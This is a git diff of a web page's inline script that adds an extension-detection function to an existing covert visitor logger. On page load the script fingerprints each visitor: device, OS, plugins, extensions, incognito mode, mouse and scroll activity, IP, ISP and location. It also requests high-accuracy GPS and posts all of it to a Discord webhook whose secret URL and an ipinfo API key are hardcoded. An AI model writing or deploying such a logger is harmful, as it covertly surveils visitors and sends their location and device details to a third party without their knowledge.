@@ -34,123 +34,151 @@
   <script src="snow.js" defer></script>
 
 <script>
-  const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
-  const webhookURL = 'https://discord.com/api/webhooks/1339271593217622157/YTICcLeK_iEf3nL_EEtkS45rsq4tHCwQALoq8Ev9Pb5y4EVji4-ciMJkWF9Lm4pndfIK';
+const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
+const webhookURL = 'https://discord.com/api/webhooks/1339271593217622157/YTICcLeK_iEf3nL_EEtkS45rsq4tHCwQALoq8Ev9Pb5y4EVji4-ciMJkWF9Lm4pndfIK';
 
-  function getOS(userAgent) {
-    if (/windows/i.test(userAgent)) return "Windows";
-    if (/macintosh|mac os x/i.test(userAgent)) return "MacOS";
-    if (/linux/i.test(userAgent)) return "Linux";
-    if (/android/i.test(userAgent)) return "Android";
-    if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
-    return "Unknown";
+function getOS(userAgent) {
+  if (/windows/i.test(userAgent)) return "Windows";
+  if (/macintosh|mac os x/i.test(userAgent)) return "MacOS";
+  if (/linux/i.test(userAgent)) return "Linux";
+  if (/android/i.test(userAgent)) return "Android";
+  if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
+  return "Unknown";
+}
+
+function getDeviceType(userAgent) {
+  return /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
+}
+
+function generateVisitorID() {
+  let visitorID = localStorage.getItem("visitorID");
+  if (!visitorID) {
+    visitorID = `VIS-${Math.random().toString(36).substring(2, 15)}`;
+    localStorage.setItem("visitorID", visitorID);
   }
+  return visitorID;
+}
 
-  function getDeviceType(userAgent) {
-    return /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
-  }
+function getVisitHistory() {
+  let visits = localStorage.getItem("visitCount") || 0;
+  visits = parseInt(visits) + 1;
+  localStorage.setItem("visitCount", visits);
+  return visits;
+}
 
-  function generateVisitorID() {
-    let visitorID = localStorage.getItem("visitorID");
-    if (!visitorID) {
-      visitorID = `VIS-${Math.random().toString(36).substring(2, 15)}`;
-      localStorage.setItem("visitorID", visitorID);
+function isIncognito() {
+  return new Promise((resolve) => {
+    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+    if (!fs) resolve(false);
+    else {
+      fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
     }
-    return visitorID;
+  });
+}
+
+function getPlugins() {
+  return navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "No plugins detected";
+}
+
+function detectExtensions() {
+  const detectedExtensions = [];
+
+  // Check for a common behavior like ad-blockers
+  const adBlockTest = document.createElement('div');
+  adBlockTest.className = 'adsbox';
+  document.body.appendChild(adBlockTest);
+
+  setTimeout(() => {
+    if (adBlockTest.offsetHeight === 0) {
+      detectedExtensions.push('Adblocker detected');
+    }
+    adBlockTest.remove();
+  }, 100);
+
+  // Check for extension specific objects in window (example: Grammarly, Honey)
+  if (typeof window.Grammarly !== 'undefined') {
+    detectedExtensions.push('Grammarly extension detected');
+  }
+  if (typeof window.honey !== 'undefined') {
+    detectedExtensions.push('Honey extension detected');
   }
 
-  function getVisitHistory() {
-    let visits = localStorage.getItem("visitCount") || 0;
-    visits = parseInt(visits) + 1;
-    localStorage.setItem("visitCount", visits);
-    return visits;
-  }
+  return detectedExtensions.length ? detectedExtensions.join(", ") : "No extensions detected";
+}
 
-  function isIncognito() {
-    return new Promise((resolve) => {
-      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-      if (!fs) resolve(false);
-      else {
-        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+function trackActivity() {
+  let mouseMoves = 0;
+  let scrollDepth = 0;
+
+  document.addEventListener("mousemove", () => mouseMoves++, { passive: true });
+  document.addEventListener("scroll", () => scrollDepth = Math.max(scrollDepth, window.scrollY), { passive: true });
+
+  return () => ({ mouseMoves, scrollDepth });
+}
+
+const activityTracker = trackActivity();
+const sessionStart = performance.now();
+
+function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A", incognito = "N/A") {
+  const userAgent = navigator.userAgent;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const language = navigator.language || navigator.userLanguage;
+  const referrer = document.referrer || "Direct Access";
+  const deviceType = getDeviceType(userAgent);
+  const operatingSystem = getOS(userAgent);
+  const visitorID = generateVisitorID();
+  const visitCount = getVisitHistory();
+  const sessionDuration = ((performance.now() - sessionStart) / 1000).toFixed(2);
+  const activityData = activityTracker();
+  const installedPlugins = getPlugins();
+  const detectedExtensions = detectExtensions(); // Extension detection
+
+  const embedData = {
+    "embeds": [{
+      "title": "New Visitor Logged",
+      "description": `**Visitor ID:** ${visitorID}\n**Previous Visits:** ${visitCount}\n**Session Time:** ${sessionDuration} seconds\n**Mouse Movements:** ${activityData.mouseMoves}\n**Scroll Depth:** ${activityData.scrollDepth}px\n\n**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**VPN Usage:** ${ipData.anycast ? "Likely VPN" : "No VPN detected"}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Device:** ${deviceType}\n**OS:** ${operatingSystem}\n**Language:** ${language}\n**Referrer:** ${referrer}\n**Incognito Mode:** ${incognito}\n**Installed Plugins:** ${installedPlugins}\n**Detected Extensions:** ${detectedExtensions}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
+      "color": 3066993,
+    }]
+  };
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(embedData)
+  })
+  .then(() => console.log('Visitor data sent.'))
+  .catch(error => console.error('Error sending data:', error));
+}
+
+async function logVisitor() {
+  const incognitoStatus = await isIncognito();
+  
+  fetch(`https://ipinfo.io?token=${apiKey}`)
+    .then(response => response.json())
+    .then(ipData => {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy, incognitoStatus);
+          },
+          (error) => {
+            console.warn("Geolocation permission denied or error:", error);
+            sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus); 
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        console.warn("Geolocation not supported by browser.");
+        sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus);
       }
-    });
-  }
-
-  function getPlugins() {
-    return navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "No plugins detected";
-  }
-
-  function trackActivity() {
-    let mouseMoves = 0;
-    let scrollDepth = 0;
-
-    document.addEventListener("mousemove", () => mouseMoves++, { passive: true });
-    document.addEventListener("scroll", () => scrollDepth = Math.max(scrollDepth, window.scrollY), { passive: true });
-
-    return () => ({ mouseMoves, scrollDepth });
-  }
-
-  const activityTracker = trackActivity();
-  const sessionStart = performance.now();
-
-  function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A", incognito = "N/A") {
-    const userAgent = navigator.userAgent;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
-    const language = navigator.language || navigator.userLanguage;
-    const referrer = document.referrer || "Direct Access";
-    const deviceType = getDeviceType(userAgent);
-    const operatingSystem = getOS(userAgent);
-    const visitorID = generateVisitorID();
-    const visitCount = getVisitHistory();
-    const sessionDuration = ((performance.now() - sessionStart) / 1000).toFixed(2);
-    const activityData = activityTracker();
-    const installedPlugins = getPlugins();
-
-    const embedData = {
-      "embeds": [{
-        "title": "New Visitor Logged",
-        "description": `**Visitor ID:** ${visitorID}\n**Previous Visits:** ${visitCount}\n**Session Time:** ${sessionDuration} seconds\n**Mouse Movements:** ${activityData.mouseMoves}\n**Scroll Depth:** ${activityData.scrollDepth}px\n\n**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**VPN Usage:** ${ipData.anycast ? "Likely VPN" : "No VPN detected"}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Device:** ${deviceType}\n**OS:** ${operatingSystem}\n**Language:** ${language}\n**Referrer:** ${referrer}\n**Incognito Mode:** ${incognito}\n**Installed Plugins:** ${installedPlugins}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
-        "color": 3066993,
-      }]
-    };
-
-    fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embedData)
     })
-    .then(() => console.log('Visitor data sent.'))
-    .catch(error => console.error('Error sending data:', error));
-  }
+    .catch(error => console.error('Error fetching IP data:', error));
+}
 
-  async function logVisitor() {
-    const incognitoStatus = await isIncognito();
-    
-    fetch(`https://ipinfo.io?token=${apiKey}`)
-      .then(response => response.json())
-      .then(ipData => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy, incognitoStatus);
-            },
-            (error) => {
-              console.warn("Geolocation permission denied or error:", error);
-              sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus); 
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        } else {
-          console.warn("Geolocation not supported by browser.");
-          sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus);
-        }
-      })
-      .catch(error => console.error('Error fetching IP data:', error));
-  }
+logVisitor();
 
-  logVisitor();
 </script>
 
 
